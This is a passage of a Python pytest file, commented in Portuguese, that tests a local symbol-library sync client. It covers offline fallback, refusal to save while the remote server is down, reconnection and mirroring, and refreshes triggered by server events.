    keep-alive do /__events -- que no hubserver so vem 15 s depois de assinar."""
    url = _porta_fechada()
    r = R.configura(ws, url)
    r.inicia()
    f2 = None
    try:
        limite = time.time() + 5
        while time.time() < limite and r.online is not False:
            time.sleep(0.05)
        assert r.online is False
        for _ in range(5):
            t0 = time.time()
            j = cli.get('/api/symbols/almox-excluidos').get_json()
            assert j['itens'] == [{'de': 'local'}] and time.time() - t0 < 0.5, time.time() - t0
        # o servidor volta, na mesma porta
        f2 = Falso()
        f2.srv = make_server('127.0.0.1', int(url.rsplit(':', 1)[1]), f2.app, threaded=True)
        threading.Thread(target=f2.srv.serve_forever, daemon=True).start()
        limite = time.time() + R.BACKOFF_MAX + 5
        while time.time() < limite and not (r.online and os.path.exists(os.path.join(ws, 'Libs', 'schlib.js'))):
            time.sleep(0.05)
        assert r.online is True, 'a sonda nao percebeu a volta'
        assert _le(ws, 'schlib.js') == f2.libs['schlib.js'], 'a volta nao trouxe o espelho'
    finally:
        r.para()
        if f2 is not None:
            f2.desce()


# ─── servidor fora ─────────────────────────────────────────────────────────────
def test_servidor_fora(ws):
    r = R.configura(ws, _porta_fechada())
    antes = {n: _le(ws, n) for n in ('lib-subs.js', 'almox-excluidos.json')}
    resp = cli.post('/api/symbols/save', json={'name': 'X'})
    assert resp.status_code == 503
    j = resp.get_json()
    assert j['ok'] is False and j['offline'] is True and 'nada foi gravado' in j['error']
    resp = cli.post('/api/save', json={'path': 'Libs/lib-subs.js', 'content': 'var libSubs = [];'})
    assert resp.status_code == 503
    # leitura cai no handler local, sobre a ultima copia
    resp = cli.get('/api/symbols/almox-excluidos')
    assert resp.status_code == 200 and resp.get_json()['itens'] == [{'de': 'local'}]
    # projeto continua local
    assert cli.post('/api/save', json={'path': 'Projects/P1/changes.js', 'content': 'var changes = [];'}).status_code == 200
    assert {n: _le(ws, n) for n in antes} == antes
    st = cli.get('/api/lib-remota/status').get_json()
    assert st['online'] is False and 'nao respondeu' in st['erro'] and st['ultimaSincronia'] is None
    assert r.refresh() is False


# ─── /__events do servidor ─────────────────────────────────────────────────────
def test_eventos_do_servidor_puxam_o_refresh(remoto, falso, ws):
    remoto.inicia()
    try:
        limite = time.time() + 10
        while time.time() < limite and not os.path.exists(os.path.join(ws, 'Libs', 'schlib.js')):
            time.sleep(0.05)
        assert _le(ws, 'schlib.js') == falso.libs['schlib.js'], 'o refresh de subida rodou'
        time.sleep(1.5)                    # deixa o /__events conectar e o debounce passar
        novo = b'var renameMap = {"symRename":{"A":"B"}};\n'
        falso.muda('rename-map.js', novo)
        limite = time.time() + 10
        while time.time() < limite and _le(ws, 'rename-map.js') != novo:
            time.sleep(0.05)
        assert _le(ws, 'rename-map.js') == novo, "o 'change' do servidor nao virou refresh"
    finally:
        remoto.para()


if __name__ == '__main__':
    sys.exit(pytest.main([__file__, '-q']))
